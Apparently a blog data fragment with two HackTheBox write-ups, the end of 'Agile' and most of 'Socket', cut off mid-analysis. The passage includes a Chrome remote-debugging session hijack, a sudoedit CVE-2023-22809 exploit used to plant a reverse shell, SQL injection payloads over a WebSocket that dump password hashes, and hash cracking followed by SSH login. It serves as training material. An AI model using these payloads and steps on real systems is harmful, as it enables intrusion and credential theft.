Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the \u0026#39;unminimize\u0026#39; command. The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Aug 3 15:45:18 2023 from 10.10.14.133 corum@agile:~$ ls user.txt We have finally reached the user.txt.\nHijacking a google chrome session through remote-debugging port Manual enumeration did not yield anything interesting to me. However, executing linpeas showed me a potential route to privilege escalation i was unaware of.\nThere is a process of google chrome running, and special attention is drawn to the fact that the --remote-debugging-port flag is set. It appears that we might be able to hijack this web session, and explore the capabilities of what runner can access in this webpage. First, we need a way for our local browser to reach the box\u0026rsquo;s port 41829. This is not directly accessible from our machine, so we must apply port forwarding. Chisel is a popular option, but since ssh exists I just utilize this approach\n1 $ ssh -L 1080:localhost:41829 corum@superpass.htb To enter the port forwarding page in Google Chrome, in the url segment we type chrome://inspect/#devices. Next, we must configure our ports to the right of \u0026ldquo;Discover network targets\u0026rdquo;\nSet the address as localhost:1080, matching the listening port listed in our ssh command. This traffic will be forwarded to Agile box\u0026rsquo;s port 41829.\nNow we can see a remote target. Notice the address is at http://test.superpass.htb. This seems to be a local-only version of the service, potentially with different password information than the live version we interacted with previously.\nSelecting inspect will open a new DevTools tab, where we can interact with the chrome session.\nSelecting the Vault, we see new passwords, this time for edwards. This was also a user account name on the machine.\nUsing the inspect tools to the side of our web session, we can easily grab the raw text to copy. For this kind of password it is much better, so that we do not mistype when copying by hand.\n1 2 3 \u0026lt;td\u0026gt;agile\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;edwards\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;d07867c6267dcb5df0af\u0026lt;/td\u0026gt; edwards:d07867c6267dcb5df0af\n1 2 3 corum@agile:~$ su edwards Password: edwards@agile:/home/corum$ Privilege escalation through sudo vulnerability The su is successful, and we now have 1 more user\u0026rsquo;s account to work with. Checking this account\u0026rsquo;s privileges, we see we can perform a sudo as dev_admin:\n1 2 3 4 5 6 7 8 edwards@agile:/home/corum$ sudo -l Matching Defaults entries for edwards on agile: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User edwards may run the following commands on agile: (dev_admin : dev_admin) sudoedit /app/config_test.json (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt This /app/app-testing/tests/functional/creds.txt is very desirable based on the name, and is only accessible by dev_admin. Upon running:\n1 edwards@agile:/home/corum$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt We see in a nano editor some more credentials for edwards.\nedwards:1d7ffjwrx#$d6qn!9nndqgde4\nThe credentials don\u0026rsquo;t work for any user on the system; perhaps they are utilized for the google chrome debugging session?\nSearching for problems with sudoedit, I quickly find a very recent CVE, CVE-2023-22809. This CVE was released in under two months from the time of writing. Affected versions are 1.8.0 through 1.9.12.p1, so first we must check this:\n1 2 3 4 5 6 edwards@agile:/home/corum$ sudo -V Sudo version 1.9.9 Sudoers policy plugin version 1.9.9 Sudoers file grammar version 48 Sudoers I/O plugin version 1.9.9 Sudoers audit plugin version 1.9.9 Version 1.9.9 will be before version 1.9.12, so this should be vulnerable! Execution seems very straightforward. If we include extra arguments in environment variables (SUDO_EDITOR, VISUAL, and EDITOR), sudoedit will allow us to edit files not meant to be edited. With this strategy, we can edit any file dev_admin can edit. Looking for interesting targets:\n1 2 3 4 5 6 7 8 9 10 11 12 13 edwards@agile:/home/corum$ find / -user dev_admin 2\u0026gt;/dev/null /home/dev_admin /app/app-testing/tests/functional/creds.txt /app/config_test.json /app/config_prod.json edwards@agile:/home/corum$ find / -group dev_admin 2\u0026gt;/dev/null /home/dev_admin /app/venv /app/venv/bin /app/venv/bin/activate /app/venv/bin/Activate.ps1 /app/venv/bin/activate.fish /app/venv/bin/activate.csh Using the sudoedit exploit, we should be able to alter any of these files. But how can we really benefit from adding a line or two in some of these files? If there is a regularly running program that takes input from one of these files, we can supply malicious commands for that user to execute. Ideally, if there is a cronjob running as root for regular intervals, we can have root execute some commands for us. We can check for things as they run using pspy. Sending pspy over to the box: On my local kali, finding where I put pspy:\n1 2 3 4 5 6 $ locate pspy /home/kali/Downloads/pspy64 ┌──(kali㉿kali)-[~/Downloads] └─$ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... On the Agile box, downloading and running pspy:\n1 2 3 4 5 6 7 8 9 10 11 12 13 edwards@agile:/dev/shm$ wget 10.10.14.133/pspy64 \u0026amp;\u0026amp; chmod +x pspy64 --2023-08-03 16:52:45-- http://10.10.14.133/pspy64 Connecting to 10.10.14.133:80... connected. HTTP request sent, awaiting response... 200 OK Length: 3104768 (3.0M) [application/octet-stream] Saving to: ‘pspy64’ pspy64 100%[==============================================\u0026gt;] 2.96M 4.00MB/s in 0.7s 2023-08-03 16:52:46 (4.00 MB/s) - ‘pspy64’ saved [3104768/3104768] edwards@agile:/dev/shm$ ./pspy64 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d After waiting a brief period, we see the root user access one of the files we can control:\n1 2023/08/03 16:56:01 CMD: UID=0 PID=51843 | /bin/bash -c source /app/venv/bin/activate We can see activate being invoked. Using our sudoedit exploit, we can alter this file to communicate back to us through a reverse shell payload. Setting up our environment variable:\n1 edwards@agile:/dev/shm$ export EDITOR=\u0026#34;vim -- /app/venv/bin/activate\u0026#34; Now executing our sudoedit command:\n1 edwards@agile:/dev/shm$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt When we execute we are not editing creds.txt. Instead, we see /app/venv/bin/activate\nTo ensure our payload runs at the start of this script, I insert the command before the commented lines:\nNow after waiting a few seconds, the connection reaches my kali machine:\n1 2 3 4 5 6 7 8 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.133] from (UNKNOWN) [10.10.11.203] 60376 bash: cannot set terminal process group (52086): Inappropriate ioctl for device bash: no job control in this shell root@agile:~# id id uid=0(root) gid=0(root) groups=0(root) Reflection After the IDOR vulnerability had been patched, this box turned out to be quite difficult! It was my first completion on a medium box, and the technique for remotely viewing the chrome process felt very original. While the sudo exploit felt quite simple, I appreciated that it wasn\u0026rsquo;t completely free since only dev_admin\u0026rsquo;s files were accessible. After going through the pain in generating the debugging PIN and sneaking into the google chrome page, it is nice to have a straightforward route to root.\n","date":"2023-08-05T09:04:19-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-agile/Agile_hu5e06ffde2f95e1276a1510a6a2985d71_363689_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-agile/","title":"HackTheBox - Agile"},{"content":"Initial Enumeration Initial nmap scanning reveals a web page, and an unusual open port only visible through full port scan:\n1 2 3 4 5 6 7 8 9 10 # Nmap 7.93 scan initiated Sat Mar 25 21:05:47 2023 as: nmap -p- -oN portsweep 10.10.11.206 Nmap scan report for 10.10.11.206 Host is up (0.058s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 5789/tcp open unknown # Nmap done at Sat Mar 25 21:05:47 2023 -- 1 IP address (1 host up) scanned in 35.78 seconds The port is uncommon, so I decided to see what nmap script and version enumeration can tell me:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 # Nmap 7.93 scan initiated Sat Mar 25 21:07:29 2023 as: nmap -sCV -p 22,80,5789 -oN nmap_initial.txt 10.10.11.206 Nmap scan report for 10.10.11.206 Host is up (0.043s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://qreader.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) 5789/tcp open unknown | fingerprint-strings: | GenericLines, GetRequest: | HTTP/1.1 400 Bad Request | Date: Wed, 12 Jul 2023 19:34:47 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close | Failed to open a WebSocket connection: did not receive a valid HTTP request. | HTTPOptions, RTSPRequest: | HTTP/1.1 400 Bad Request | Date: Wed, 12 Jul 2023 19:34:48 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close | Failed to open a WebSocket connection: did not receive a valid HTTP request. | Help, SSLSessionReq: | HTTP/1.1 400 Bad Request | Date: Wed, 12 Jul 2023 19:35:03 GMT | Server: Python/3.10 websockets/10.4 | Content-Length: 77 | Content-Type: text/plain | Connection: close |_ Failed to open a WebSocket connection: did not receive a valid HTTP request. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port5789-TCP:V=7.93%I=7%D=7/12%Time=64AF3896%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Wed,\\x201 SF:2\\x20Jul\\x202023\\x2019:34:47\\x20GMT\\r\\nServer:\\x20Python/3\\.10\\x20webso SF:ckets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20text/plain\\r\\n SF:Connection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20WebSocket\\x20c SF:onnection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\x20request\\.\\ SF:n\u0026#34;)%r(GetRequest,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Wed SF:,\\x2012\\x20Jul\\x202023\\x2019:34:47\\x20GMT\\r\\nServer:\\x20Python/3\\.10\\x2 SF:0websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20text/pla SF:in\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20WebSocke SF:t\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\x20requ SF:est\\.\\n\u0026#34;)%r(HTTPOptions,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate: SF:\\x20Wed,\\x2012\\x20Jul\\x202023\\x2019:34:48\\x20GMT\\r\\nServer:\\x20Python/3 SF:\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20t SF:ext/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20W SF:ebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\ SF:x20request\\.\\n\u0026#34;)%r(RTSPRequest,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nDate:\\x20Wed,\\x2012\\x20Jul\\x202023\\x2019:34:48\\x20GMT\\r\\nServer:\\x20P SF:ython/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Typ SF:e:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x2 SF:0a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x SF:20HTTP\\x20request\\.\\n\u0026#34;)%r(Help,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nDate:\\x20Wed,\\x2012\\x20Jul\\x202023\\x2019:35:03\\x20GMT\\r\\nServer:\\x20P SF:ython/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Typ SF:e:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x2 SF:0a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x SF:20HTTP\\x20request\\.\\n\u0026#34;)%r(SSLSessionReq,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20 SF:Request\\r\\nDate:\\x20Wed,\\x2012\\x20Jul\\x202023\\x2019:35:03\\x20GMT\\r\\nSer SF:ver:\\x20Python/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nCo SF:ntent-Type:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x SF:20open\\x20a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x SF:20valid\\x20HTTP\\x20request\\.\\n\u0026#34;); Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Mar 25 21:07:29 2023 -- 1 IP address (1 host up) scanned in 92.72 seconds We can see from Server: Python/3.10 websockets/10.4, that this unusual port is an open web socket. We will come back to this later.\nExamining the webpage Trying to visit the box\u0026rsquo;s ip address as 10.10.11.206 redirects us to qreader.htb. To properly visit the webpage that should be visible on port 80, we must add the address to our /etc/hosts file:\n1 $ echo \u0026#34;10.10.11.206 qreader.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Now the website is viewable.\nWe see the website advertised as a QR code reader:\nWe can test it out within the browser, or they allow us to download an offline version further below. There are options for windows or linux versions. Being on linux, I will use this version for now and hope there is no significant difference between the two.\n1 2 $ file QReader_lin_v0.0.2.zip QReader_lin_v0.0.2.zip: Zip archive data, at least v1.0 to extract, compression method=store Analyzing the QR Code Reader The zip contains an ELF binary for the QR code reader and a test.png to try it out\nAfter translating test.png it returns the box creator\u0026rsquo;s username. Nice touch. Selecting the about tab, and trying to get info on either the version or updates will return this Connection error message. What could it be connecting to, perhaps our box\u0026rsquo;s WebSocket port? Since the box itself is created and tested with static IP addresses, it isn\u0026rsquo;t unreasonable to believe that when the box is moved to live environments with the hosting IP address constantly changing, that connection attempts like this one might fail.\nWith the app open, I monitored the packet traffic data using tcpdump:\n1 2 3 4 5 6 7 8 $ sudo tcpdump tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes \u0026lt;...SNIP...\u0026gt; 20:04:21.317409 IP 10.0.2.15.53274 \u0026gt; 108-166-149-2.client.mchsi.com.domain: 56266+ A? ws.qreader.htb. (32) 20:04:21.317495 IP 10.0.2.15.53274 \u0026gt; 108-166-149-2.client.mchsi.com.domain: 57288+ AAAA? ws.qreader.htb. (32) 20:04:21.338657 IP 108-166-149-2.client.mchsi.com.domain \u0026gt; 10.0.2.15.53274: 56266 NXDomain 0/1/0 (107) 20:04:21.338724 IP 108-166-149-2.client.mchsi.com.domain \u0026gt; 10.0.2.15.53274: 57288 NXDomain 0/1/0 (107) When I query for updates, I see traffic pointing at ws.qreader.htb\nI had hoped to see the data information being sent to the WebSocket, but for this case it was not necessary as the error responses were informative enough. I had heard the data can be retrieved through decompiling the binary file, but this is beyond my skill at the time.\nExamining the exposed WebSocket Interacting with web sockets can be tricky. There are a variety of ways to do it, but I chose to utilize a Simple WebSocket Client Plugin for FireFox. Loading the page, we can input our url as ws://10.10.11.206:5789\nFortunately for us, it looks as though an improper input provides us with a small list of options on how we might interact. Since the output was JSON format, it is likely that the input must be JSON as well. After exploring for a bit, I find another response when probing ws://10.10.11.206:5789/update\nIt was a bit of a lucky hit that any version not 0.0.2 will return a message like this, otherwise it could be more difficult finding the version naming conventions in use. Now returning to /version, I check what happens when I input the older version 0.0.1:\nThere doesn\u0026rsquo;t seem to be any extra information leaked through these queries. Upon closer inspection, however, we can eventually discover that these /version queries are SQL injectable.\nNote that despite supplying the invalid version, we still receive the confirmation of version 0.0.2. From here, we should be able to leak the database information.\nFoothold Manual enumeration with SQLi UNION injections Eventually I find that the database is sqlite through the query UNION SELECT sql from sqlite_master:\n1 2 3 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} Note that this type of sql injection often depends on having the same number of columns as the usual output. Since typically this websocket is expected to provide 4 columns (id, version, release_date and downloads), I supplement my union injection with 3 columns of NULL.\nThis first output shows a table called versions, which is likely what we are already getting from non-injected queries. Dumping all tables might be slow this way, but we can do so by supplying LIMIT to our query:\nNote that in this query I use tbl_name, so that the output isn\u0026rsquo;t so long. Using sql provides us information on all column names from within the table, so it is useful to use once we find an interesting table. For a better word-wrapping experience, from this point on I put all outputs in code brackets\nAfter dumping all tables, we see a full picture that looks like this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT, answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 2-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE info (id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT, value TEXT)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 3-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE reports (id INTEGER PRIMARY KEY AUTOINCREMENT, reporter_name TEXT, subject TEXT, description TEXT, reported_date DATE)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 4-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE sqlite_sequence(name,seq)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 5-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 6-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} Users database is a clear standout, and may contain valuable credentials:\n1 2 3 4 5 6 7 8 9 10 11 12 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT username,password,role,NULL FROM users where id = 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;0c090c365fa0559b151a43e0fea39710\u0026#34;, \u0026#34;released_date\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT username,password,role,NULL FROM users where id = 2-- -\u0026#34;} {\u0026#34;message\u0026#34;: \u0026#34;Invalid version!\u0026#34;} After dumping credentials for admin, there are no other entries in the table. Before leaving the sql database, we should explore some of the other tables. This turned out to be a good idea, because more useful information is found in the answers table:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT, answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT answered_by,answer,status,NULL FROM answers where id = 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;Hello Json,\\n\\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\\n\\nThomas Keller\u0026#34;, \u0026#34;released_date\u0026#34;: \u0026#34;PENDING\u0026#34;, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT answered_by,answer,status,NULL FROM answers where id = 2-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;Hello Mike,\\n\\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\\n\\nThomas Keller\u0026#34;, \u0026#34;released_date\u0026#34;: \u0026#34;PENDING\u0026#34;, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT answered_by,answer,status,NULL FROM answers where id = 3-- -\u0026#34;} {\u0026#34;message\u0026#34;: \u0026#34;Invalid version!\u0026#34;} We see messages from an id of admin, where he signs off as Thomas Keller. This can give us potential ideas as to what username(s) might be on the machine.\nBonus: using SQLMap to dump the database Because the SQL injection is done through a WebSocket interaction, utilizing SQLMap is a little more complex than usual. Although SQLMap has WebSocket compatibility, it has been difficult to properly launch in my experience. However, there is a nice blog article that highlights a clever approach to using sqlmap over a WebSocket. In this approach, the author sets up a python server script that will receive SQLMap\u0026rsquo;s queries, transform the payload to a relevant JSON query, then redirect it to the WebSocket of interest.\nFirst, the python redirection script needs to be updated to our situation. The ws_server value must be changed, and also the payload replace line must be altered. Line 6:\n1 ws_server = \u0026#34;ws://10.10.11.206:5789/version\u0026#34; Line 14:\n1 2 message = unquote(payload).replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\\\\\\\u0026#34;\u0026#39;) # replacing \u0026#34; with \u0026#39; to avoid breaking JSON structure data = \u0026#39;{\u0026#34;version\u0026#34;:\u0026#34;%s\u0026#34;}\u0026#39; % message Now we can run the python script, and in a new tab initiate sqlmap.\n1 2 3 $ python wserv.py [+] Starting MiddleWare Server [+] Send payloads in http://localhost:8081/?id=* And finally run sqlmap:\n1 $ sqlmap -u http://localhost:8081/?id=0.0.1 --tables --dump SQLMap output: Database: Table: reports\n[2 entries]\n1 2 3 4 | id | subject | description | reported_date | reporter_name | |----|---------------------------|---------------------------------------------------------------------------------------------------------------------|---------------|---------------| | 1 | Accept JPEG files | Is there a way to convert JPEG images with this tool? Or should I convert my JPEG to PNG and then use it? | 13/08/2022 | Jason | | 2 | Converting non-ascii text | When I try to embed non-ascii text, it always gives me an error. It would be nice if you could take a look at this. | 22/09/2022 | Mike | Database: Table: users\n[1 entry]\n1 2 3 | id | role | password | username | |----|-------|----------------------------------|----------| | 1 | admin | 0c090c365fa0559b151a43e0fea39710 | admin | Database: Table: answers\n[2 entries]\n1 2 3 4 | id | report_id | answer | status | FOREIGN | answered_by | answered_date | |----|-----------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------|---------|-------------|---------------| | 1 | \u0026lt;blank\u0026gt; | Hello Json, As if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version. | PENDING | \u0026lt;blank\u0026gt; | admin | 17/08/2022 | | 2 | \u0026lt;blank\u0026gt; | Hello Mike, We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now! Thomas Keller | PENDING | \u0026lt;blank\u0026gt; | admin | 25/09/2022 | SQLMap produces everything very fast in case we missed something, but it was a little tricky to set up this time. If the SQLi type had been a blind injection, enumerating everything by hand can be extremely time consuming. It is good to know how we might make automation for this task possible.\nAuthenticating through ssh With exploration of the database finished, we can finally move on to the obtained Administrator credentials. Since it is information stored in the sqlite table, it is highly likely to be a password hash. Fortunately enough, we don\u0026rsquo;t even have to crack it ourselves. A quick trip over to crackstation, and we get the plaintext password immediately.\nWe now have creds as Admin:denjanjade122566\nTrying to log in through ssh:\n1 2 3 $ ssh admin@qreader.htb admin@qreader.htb\u0026#39;s password: Permission denied, please try again. The password doesn\u0026rsquo;t work for the user admin, but based on the other messages we gleaned from the database we know his name as well. On my first guessing combination, I land at a successful login for tkeller\n1 2 3 $ ssh tkeller@qreader.htb tkeller@qreader.htb\u0026#39;s password: Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-67-generic x86_64) One tool that might be helpful for generating usernames from full names is username_anarchy. In this case because of my lucky guess, I did not need to use.\nAt this point the user.txt is up for grabs.\nPrivilege Escalation Enumeration: Checking tkeller's sudo privileges,\n1 2 3 4 5 6 tkeller@socket:~$ sudo -l Matching Defaults entries for tkeller on socket: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User tkeller may run the following commands on socket: (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh We see that we can run build-installer.sh as any user, including root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 tkeller@socket:~$ cat /usr/local/sbin/build-installer.sh #!/bin/bash if [ $# -ne 2 ] \u0026amp;\u0026amp; [[ $1 != \u0026#39;cleanup\u0026#39; ]]; then /usr/bin/echo \u0026#34;No enough arguments supplied\u0026#34; exit 1; fi action=$1 name=$2 ext=$(/usr/bin/echo $2 |/usr/bin/awk -F\u0026#39;.\u0026#39; \u0026#39;{ print $(NF) }\u0026#39;) if [[ -L $name ]];then /usr/bin/echo \u0026#39;Symlinks are not allowed\u0026#39; exit 1; fi if [[ $action == \u0026#39;build\u0026#39; ]]; then if [[ $ext == \u0026#39;spec\u0026#39; ]] ; then /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2\u0026gt;/dev/null /home/svc/.local/bin/pyinstaller $name /usr/bin/mv ./dist ./build /opt/shared else echo \u0026#34;Invalid file format\u0026#34; exit 1; fi elif [[ $action == \u0026#39;make\u0026#39; ]]; then if [[ $ext == \u0026#39;py\u0026#39; ]] ; then /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2\u0026gt;/dev/null /root/.local/bin/pyinstaller -F --name \u0026#34;qreader\u0026#34; $name --specpath /tmp /usr/bin/mv ./dist ./build /opt/shared else echo \u0026#34;Invalid file format\u0026#34; exit 1; fi elif [[ $action == \u0026#39;cleanup\u0026#39; ]]; then /usr/bin/rm -r ./build ./dist 2\u0026gt;/dev/null /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2\u0026gt;/dev/null /usr/bin/rm /tmp/qreader* 2\u0026gt;/dev/null else /usr/bin/echo \u0026#39;Invalid action\u0026#39; exit 1; fi All binaries are defined by full path, so we cannot get an easy win through PATH abuse.\nLooking at segments where we might supply our own input, we can see under \u0026lsquo;build\u0026rsquo; and \u0026lsquo;make\u0026rsquo; options, we supply the file names following pyinstaller. 